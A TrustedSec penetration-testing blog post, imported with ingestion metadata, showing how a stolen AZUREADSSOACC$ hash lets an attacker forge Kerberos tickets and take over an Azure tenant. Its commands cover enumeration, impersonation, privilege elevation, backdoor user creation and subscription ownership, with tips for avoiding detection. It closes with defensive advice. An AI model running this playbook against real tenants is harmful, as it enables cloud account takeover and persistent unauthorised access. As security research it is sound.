---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-09_azure-ad-kerberos-tickets-pivoting-to-the-cloud.md
original_filename: 2023-02-09_azure-ad-kerberos-tickets-pivoting-to-the-cloud.md
title: 'Azure Ad Kerberos Tickets: Pivoting To The Cloud'
category: documents
detected_topics:
- idor
- mfa
- sso
- command-injection
- otp
- rate-limit
tags:
- imported
- documents
- idor
- mfa
- sso
- command-injection
- otp
- rate-limit
language: en
raw_sha256: fb8983e624dd38de3f412de62e7f20f810aa8e6315c721ddc1e428160d9cfa43
text_sha256: 96bfde6bc5c077a8ebdb72a9b6b836ba5563b7f3509c4cfca3936129851615d0
ingested_at: '2026-06-28T07:32:18Z'
sensitivity: unknown
redactions_applied: false
---

# Azure Ad Kerberos Tickets: Pivoting To The Cloud

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-09_azure-ad-kerberos-tickets-pivoting-to-the-cloud.md
- Source Type: markdown
- Detected Topics: idor, mfa, sso, command-injection, otp, rate-limit
- Ingested At: 2026-06-28T07:32:18Z
- Redactions Applied: False
- Raw SHA256: `fb8983e624dd38de3f412de62e7f20f810aa8e6315c721ddc1e428160d9cfa43`
- Text SHA256: `96bfde6bc5c077a8ebdb72a9b6b836ba5563b7f3509c4cfca3936129851615d0`


## Content

---
title: "Azure Ad Kerberos Tickets: Pivoting To The Cloud"
page_title: "TrustedSec | Azure AD Kerberos Tickets: Pivoting to the Cloud"
url: "https://www.trustedsec.com/blog/azure-ad-kerberos-tickets-pivoting-to-the-cloud/"
final_url: "https://www.trustedsec.com/blog/azure-ad-kerberos-tickets-pivoting-to-the-cloud"
authors: ["Edwin David"]
bugs: ["Active Directory", "Cloud", "Lateral movement"]
publication_date: "2023-02-09"
added_date: "2023-02-13"
source: "pentester.land/writeups.json"
original_index: 1556
---

* [Blog](https://trustedsec.com/blog)
  * [Azure AD Kerberos Tickets: Pivoting to the Cloud](https://trustedsec.com/blog/azure-ad-kerberos-tickets-pivoting-to-the-cloud)

February 09, 2023

# Azure AD Kerberos Tickets: Pivoting to the Cloud

Written by Edwin David 

Active Directory Security Review Cloud Assessment Cloud Baseline Configuration Review Cloud Penetration Testing Penetration Testing Security Testing & Analysis

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/AzureADKerberos_WebHero.jpg?w=320&h=320&q=90&auto=format&fit=crop&dm=1767067992&s=de8ac3d651345db535daa96dc2cb96d4)

Share

  * [Share URL]( "Share URL")
  * [Share via Email](/cdn-cgi/l/email-protection#417e3234232b2422357c022924222a6473712e34356473713529283264737120333528222d2464737127332e2c6473711533343235242512242264737067202c317a232e25387c003b34332464737100056473710a24332324332e326473711528222a2435326472006473711128372e35282f26647371352e647371352924647371022d2e34256472006473712935353132647200647307647307353334323524253224226f222e2c647307232d2e26647307203b3433246c20256c2a24332324332e326c3528222a2435326c3128372e35282f266c352e6c3529246c222d2e3425 "Share via Email")
  * [Share on Facebook](https://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fazure-ad-kerberos-tickets-pivoting-to-the-cloud "Share on Facebook")
  * [Share on X](https://twitter.com/share?text=Azure%20AD%20Kerberos%20Tickets%3A%20Pivoting%20to%20the%20Cloud%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fazure-ad-kerberos-tickets-pivoting-to-the-cloud "Share on X")
  * [Share on LinkedIn](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fazure-ad-kerberos-tickets-pivoting-to-the-cloud&mini=true "Share on LinkedIn")

If you've ever been doing an Internal Penetration test where you've reached Domain Admin status and you have a cloud presence, your entire Azure cloud can still be compromised. In this blog, I'll take you through this scenario and show you the dangers of machine account SSO compromise. We will do so without extracting any user account hashes and will have the ability to impersonate any account without MFA to achieve full cloud dominance.

## **Scenario:**

While an Internal Penetration test was being conducted, a service account with backup privileges to a Domain Controller (DC) was compromised. The team conducting the test was able to achieve full internal domain compromise. Using [**_SecretsDump_**](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py), the team extracted the machine account, **AZUREADSSOACC$**. This indicates that Azure SSO may be enabled in the target tenant.

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-1.png)Figure 1 - SSO Machine Account NTLM Extraction

To confirm Azure SSO was in use in this hybrid environment, **_AADInternals_** was used to perform reconnaissance on the Azure environment as an outsider. **_AADInternals_** can be obtained from the PowerShell Gallery or from GitHub. We can perform reconnaissance with the following command:

`Invoke-AADIntReconAsOutsider -Domain domain.local | Format-Table`

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-2.png)Figure 2 - Initial Azure Tenant Enumeration With AADInternals

Now that we have confirmed that SSO is in use, we will need to do some initial reconnaissance of the Azure environment. First, we will need to pick out a user. Service accounts are preferred since they are normally not backed with any form of MFA. One common issue that occurs when an enterprise syncs Azure AD for the first time, is that they will sync all on-premises AD environment IDs to the cloud. Service accounts can easily be pulled from an internal foothold in an AD environment.

An easy way to manually confirm if an ID is synced to an Azure environment is to simply type the full [**_UPN_**](https://social.technet.microsoft.com/wiki/contents/articles/52250.active-directory-user-principal-name.aspx) in the Azure portal, and see if it asks for a password. In the case below, we are prompted to enter a password. This is a good sign that we have an ID that can be used for initial reconnaissance.

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-3.png)Figure 3 - Manual User Enumeration

Going back to our foothold in the internal AD environment, usernames beginning with 'SVC' SIDs were exfiltrated using **_rpcclient_**. Using **_rpcclient_** to query accounts directly from a DC does not produce any alerts from Defender for Identity.

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-4.png)Figure 4 - Account Enumeration With rpcclient![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-5.png)Figure 5 - SID Lookup With rpcclient

We can now confirm we have the following pieces of information needed to impersonate accounts in the Azure cloud:

  * **AZUREADSSOACC$** NTLM hash
  * SIDs to accounts of interest that may not be backed by MFA
  * None of the service accounts have conditional access policies for sign-in restrictions from untrusted locations

Using **_AADInternals_** , we can create a new Kerberos ticket. I should also mention that getting a Kerberos ticket and requesting a token for services such as Microsoft Graph does not require line of sight to an on-premises DC. We are now issuing an access request via Kerberos to the cloud. If you receive a token, then you're in good shape to start doing initial cloud reconnaissance with an Azure tool called **_[ROADtools](https://github.com/dirkjanm/ROADtools)_**(One of my personal favorites). Keep in mind, we have zero knowledge of what the password is to the **svc_mssql** account.

First, command grabs a Kerberos ticket for the **svc_mssql** account, then we use the NTLM hash from the **AZUREADSSOACC$** machine account.

`$kerberos=NewAADIntKerberosTicket -SidString <Internal AD SID> -Hash <SSOACC$ NTLM Hash>`

Second, command initiates an access token for Azure AD graph from the Kerberos ticket. This is necessary so we can pass the token to use with **_ROADTools_**.

`Get-AADIntAccessTokenForAADGraph -KerberosTicket $kerberos -Domain domain.local`

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-6.png)Figure 6 - Kerberos Ticket Request and Passing the Token

Next, we replay the token with **_ROADRecon_** for initial authentication by issuing the following command from a Linux box with **_ROADRecon_** installed.

roadrecon auth –access-token <Token>

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-7.png)Figure 7 - Passing Token In Roadrecon

Once the tokens are written, you can issue a gather command in **_ROADRecon_**. This will gather information for all users, groups, and anyone with special privileges in Azure.

`roadrecon gather`

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-8.png)Figure 8 - ROADRecon Enumeration

After the initial recon with road tools is finished, we can load the GUI, which will spin up a web server running on port 5000. Take care in doing this by making sure your attack box is not exposed on a public IP, as this would be accessible for anyone making a connection on this port.

`roadrecon gui`

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-9.png)Figure 9 - Invoking ROADRecon GUI

Inside the **_ROADRecon_** GUI, we can see a few different options at our disposal for global administrator takeover. Two AD account types have global administrator privileges, **_ADSync_** and **_svc_backup_**. **_ADSync_** is more than likely a manually created service account running directory synchronizations with Azure. This is very common to see. We also can distinguish between cloud accounts and AD accounts within the GUI as well.

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-10.png)Figure 10 - Global Administrators in ROADRecon

Next, lets flip back into PowerShell. We can connect to Azure AD with the **_AadAccessToken_** parameter and replay the same token from the previous one we generated.

`Connect-AzureAD -AadAccessToken <Token>`

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-11.png)Figure 11 - Passing the Token to Azure AD

At this point, we no longer need access to the DC, even if the Blue Team evicts us and changes the passwords in their environment. If the **AZUREADSSOACC$** machine account doesn’t have the NTLM hash rotated, we will continue to have persistent access to the cloud environment with the previously identified service accounts. If we need to gather SIDs via impersonation, we can do so with the following command.

`Get-AzureADUser | Select UserPrincipalName, OnPremisesSecurityIdentifier`

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-12.png)Figure 12 - On Premises SID Enumeration

So where do we go from here? We've already identified the SID for the **adsync** account, so the next step is to impersonate the global administrator by using the **adsync** account. Since we have access to the global administrator service account, we can repeat the process above but in a slightly different way with **_AADInternals_**.

A few things to keep in mind on this next playbook with impersonating a global administrator:

  * A service account may not have access to Azure subscriptions to the account.
  * We'll use the `-savetocache` command so that any **_AADInternals_** commands or Azure PowerShell commands we use will just pull the tokens we have from cache.
  * We'll elevate our authenticated global administrator to Azure User Access Administrator with the `Grant-AADIntAzureUserAccessAdminRole` that is scoped at the root “/” of our account. 
  * This will allow the global administrator to see subscriptions and assign permissions to running Azure assets if necessary.
  * We'll confirm that we can see the subscriptions with the `Get-AADIntAzureSubscriptions` command.

First, grab your Kerberos ticket.

`$kerberos=NewAADIntKerberosTicket -SidString <Internal AD SID> -Hash <SSOACC$ NTLM Hash>`

Grab the access tokens to three different services. I find this is easiest when using **_AADInternals_**.

`Get-AADIntAccessTokenForAADGraph -KerberosTicket $kerberos -Domain domain.local -SaveToCache`

`Get-AADIntAccessTokenForMSGraph -KerberosTicket $kerberos -Domain domain.local -SaveToCache`

`Get-AADIntAccessTokenForAzureCoreManagement -KerberosTicket $kerberos -Domain domain.local -SaveToCache`

Elevate the access to User Access Administrator to the root of Azure.

`Grant-AADIntAzureUserAccessAdminRole`

Make sure you can now see subscriptions after you've elevated permissions to the root of Azure.

`Get-AADIntAzureSubscriptions`

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-13.png)Figure 13 - Saving Tokens to Cache

Now that we've ensured that our compromised global administrator service account has full subscription access, we can create a new cloud user for interactive sign-ins with **_AADInternals_**. Make sure you save the **_ObjectID_** that gets flushed out with the `NewAADIntUser` command since we'll need it for later.

`New-AADIntUser -UserPrincipalName [[email protected]](/cdn-cgi/l/email-protection) -DisplayName "pwned user"`

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-14.png)Figure 14 - Creating New Azure AD User

Creating the user above will also give us the password to the account in the output as well.

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-15.png)Figure 15 - Password For New User

Now, with our freshly minted subscription rights via our **adsync** account, we will use `connect-azaccount` and some PowerShell commands in a fresh terminal window so we can re-walk the process of impersonating our **adsync** account, grab a token for Azure core management, and log in with **connect-azaccount** with the token.

Here is our command flow using the **adsync** account:

`$kerberos=NewAADIntKerberosTicket -SidString “<Internal AD sid>” -Hash <SSOACC$ NTLM Hash>`

`Get-AADIntAccessTokenForAzureCoreManagement -KerberosTicket $kerberos -Domain domain.local -SaveToCache`

`Connect-AzAccount -AccessToken <Token>`

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-16.png)Figure 16 - Passing Token to Azure AD

Next, we can use `Get-AZSubscription` and issue a **_$subScope_** variable. This will make it easier to add subscription ownership to the **pwned.user** account we have already created.

`$subScope = "subscriptions/<id of subscription>"`

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-17.png)Figure 17 - Configure Subscription Scopes

Now we can issue a `New-AzRoleAssignment` command with the **_ObjectID_** of the **pwned.user** account and give it ownership rights to the subscription.

`New-AzRoleAssignment -ObjectID <object id of account> -RoleDefinitionName "Owner" -$subScope`

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-18.png)Figure 18 - Issue New Role Assignment for Azure Subscription  

Using our new user account, we can sign into Azure and see that we have ownership access to the subscription. The sky is the limit at this point.

![](https://www.trustedsec.com/wp-content/uploads/2023/02/Figure-19.png)Figure 19 - Subscription Owner Verification

## **Conclusion** :

Great care should be taken into consideration when using Azure SSO in your enterprise. The seamless authentication experience has great benefits for end-users getting access granted to different workloads without the need to put in a password multiple times, but danger is also present if an enterprise isn’t including the **AZUREADSSOACC$** in their security hygiene process. Just as you should be rotating the **krbtgt** account to your internal domain on a regular basis, you should be including the **AZUREADSSOACC$** machine account key rotation as well. Microsoft has this process documented in the following link:

<https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso-faq#how-can-i-roll-over-the-kerberos-decryption-key-of-the--azureadsso--computer-account->

Service account sign on should also be controlled in conditional access by trusted locations. Most of the time, service accounts are probably not signing into Azure at all. Having a conditional access policy in place for service accounts will minimize pivoting options for an attacker.

**References:**

AADInternals - <https://aadinternals.com/aadinternals/>

ROADtools - <https://github.com/dirkjanm/ROADtools>

Special thanks to [@DrAzureAD](https://twitter.com/DrAzureAD) for AADInternals and [@_dirkjan](https://twitter.com/_dirkjan) for ROADtools.

Share

  * [Share URL]( "Share URL")
  * [Share via Email](/cdn-cgi/l/email-protection#9da2eee8fff7f8fee9a0def5f8fef6b8afadf2e8e9b8afade9f5f4eeb8afadfcefe9f4fef1f8b8afadfbeff2f0b8afadc9efe8eee9f8f9cef8feb8afacbbfcf0eda6fff2f9e4a0dce7e8eff8b8afaddcd9b8afadd6f8effff8eff2eeb8afadc9f4fef6f8e9eeb8aedcb8afadcdf4ebf2e9f4f3fab8afade9f2b8afade9f5f8b8afaddef1f2e8f9b8aedcb8afadf5e9e9edeeb8aedcb8afdbb8afdbe9efe8eee9f8f9eef8feb3fef2f0b8afdbfff1f2fab8afdbfce7e8eff8b0fcf9b0f6f8effff8eff2eeb0e9f4fef6f8e9eeb0edf4ebf2e9f4f3fab0e9f2b0e9f5f8b0fef1f2e8f9 "Share via Email")
  * [Share on Facebook](https://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fazure-ad-kerberos-tickets-pivoting-to-the-cloud "Share on Facebook")
  * [Share on X](https://twitter.com/share?text=Azure%20AD%20Kerberos%20Tickets%3A%20Pivoting%20to%20the%20Cloud%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fazure-ad-kerberos-tickets-pivoting-to-the-cloud "Share on X")
  * [Share on LinkedIn](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fazure-ad-kerberos-tickets-pivoting-to-the-cloud&mini=true "Share on LinkedIn")
